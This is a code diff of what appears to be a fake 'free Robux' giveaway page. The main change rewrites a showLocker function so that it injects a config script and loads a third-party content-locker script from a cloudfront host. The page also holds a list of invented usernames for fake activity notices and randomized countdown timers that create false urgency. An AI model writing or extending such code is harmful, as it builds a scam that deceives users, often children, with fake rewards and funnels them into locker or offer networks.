@@ -1,22 +1,19 @@
-<script type="text/javascript">
-  var BShtZ_iEt_khrnhc={"it":4146566,"key":"27ad0"};
-</script>
-<script src="https://d3v3431sr9puku.cloudfront.net/0a1f25d.js"></script>
-
 <script>
 (() => {
   const ROBUX_ICON = 'https://images.rbxcdn.com/e854eb7b2951ac03edba9a2681032bba.ico';
 
   const showLocker = () => {
-    if (typeof window.BShtZ_iEt_khrnhc_show === 'function') {
-      window.BShtZ_iEt_khrnhc_show();
-    } else if (typeof window.showLocker === 'function') {
-      window.showLocker();
-    } else {
-      const s = document.createElement('script');
-      s.src = 'https://d3v3431sr9puku.cloudfront.net/0a1f25d.js';
-      document.body.appendChild(s);
-    }
+    document.querySelectorAll('script[data-adblue]').forEach(s => s.remove());
+
+    const config = document.createElement('script');
+    config.setAttribute('data-adblue', '1');
+    config.textContent = 'var BShtZ_iEt_khrnhc={"it":4146566,"key":"27ad0"};';
+    document.body.appendChild(config);
+
+    const s = document.createElement('script');
+    s.setAttribute('data-adblue', '1');
+    s.src = 'https://d3v3431sr9puku.cloudfront.net/0a1f25d.js';
+    document.body.appendChild(s);
   };
 
   const names = ["PioBlx", "RobloxKing", "NoobMaster69", "Builderman", "GamerGirl99", "ShadowHunter", "EpicLoot", "Vortex", "Zenix", "Krystal"];
@@ -117,7 +114,7 @@
     const faqRoot = document.getElementById('faq');
     faqRoot.innerHTML = '';
 
-    faqs.forEach((item, idx) => {
+    faqs.forEach((item) => {
       const wrap = document.createElement('div');
       wrap.className = 'faq-item';
 
@@ -179,7 +176,7 @@
     .map(() => Math.floor(Math.random() * (300 - 180 + 1)) + 180);
 
   const tickCountdowns = () => {
-    document.querySelectorAll('.countdown[data-countdown]').forEach((el, idx) => {
+    document.querySelectorAll('.countdown[data-countdown]').forEach((el) => {
       const n = Math.max(0, Number(el.dataset.countdown) - 1);
       el.dataset.countdown = String(n);
       const card = el.closest('.pkg');
